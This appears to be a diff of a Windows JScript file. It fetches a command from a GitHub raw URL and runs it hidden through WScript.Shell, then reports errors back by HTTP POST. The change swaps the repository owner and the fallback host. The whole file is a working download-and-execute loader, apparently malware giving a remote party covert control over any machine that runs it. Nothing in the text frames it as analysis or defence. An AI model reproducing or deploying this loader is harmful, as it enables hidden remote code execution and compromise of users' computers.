@@ -1,13 +1,13 @@
 h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 h.SetTimeouts(0, 0, 0, 0);
 try {
-h.Open("GET","https://github.com/begiilm/mailchm/raw/master/cmd",false);
+h.Open("GET","https://github.com/wangzhizhun/mailchm/raw/master/cmd",false);
 h.Send();
 c = h.ResponseText;
 r = new ActiveXObject("WScript.Shell").Run(c,0,true);
 } catch(e1) {
 p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 p.SetTimeouts(0, 0, 0, 0);
-p.Open("POST","http://10.20.64.223/cmd",false);
+p.Open("POST","https://github.com/wangzhizhun/mailchm/raw/master/cmd",false);
 p.Send("[Some thing wrong !! ]\n");
 }
